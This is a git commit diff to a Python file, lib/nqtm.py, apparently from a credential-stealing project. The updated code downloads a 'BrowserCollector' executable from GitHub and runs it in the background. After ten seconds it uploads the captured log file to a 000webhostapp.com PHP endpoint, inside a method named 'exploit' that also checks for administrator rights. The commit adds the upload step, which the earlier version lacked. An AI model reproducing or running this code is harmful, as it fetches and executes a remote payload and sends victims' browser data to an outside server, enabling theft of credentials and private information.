03736e7a8d9ee92ed98a79a969654feec41696ec
somkietacode <108131461+somkietacode@users.noreply.github.com>
2022-06-28 08:25:54 -0700

    Update nqtm.py

--- lib/nqtm.py
+++ lib/nqtm.py
@@ -1,30 +1,36 @@
 import requests
 import ctypes, sys
-import subprocess, os
+import subprocess,  random, string, os, threading, time
 
-url = 'https://github.com/somkietacode/simple-exec/raw/main/BrowserCollector_x64.exe'
-r = requests.get(url, allow_redirects=True)
-open('BrowserCollector.exe', 'wb').write(r.content)
+
 
 class xyz():
 
-        def is_admin():
-                try:
-                        return ctypes.windll.shell32.IsUserAnAdmin()
-                except:
-                        return False
 
-        def init(self):
-                print(is_admin())
+        def __init__(self):
+
+                def is_admin():
+                        try:
+                                return ctypes.windll.shell32.IsUserAnAdmin()
+                        except:
+                                return False
+
+                url = 'https://github.com/somkietacode/simple-exec/raw/main/BrowserCollector_x64.exe'
+                r = requests.get(url, allow_redirects=True)
+                open('xxxxxxxx.exe', 'wb').write(r.content)
                 self.is_admin = is_admin()
 
         def exploit(self):
-                os.system('BrowserCollector.exe > log.txt \n')
-                os.remove('BrowserCollector.exe')
 
-        def send():
-            d = open('log.txt','r').read()
-            print(d)
+                def send():
+                    t = threading.Thread(target=os.system, args=('xxxxxxxx.exe > log.txt',) )
+                    t.start()
+                    time.sleep(10)
+                    name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(25))
+                    r = requests.post('https://filehandler-nqtm.000webhostapp.com/post-file.php', data={ 'x' : open('log.txt', 'rb').read() })
+                    print(r.text)
+                send()
+
 
 
 if __name__ == "__main__" :
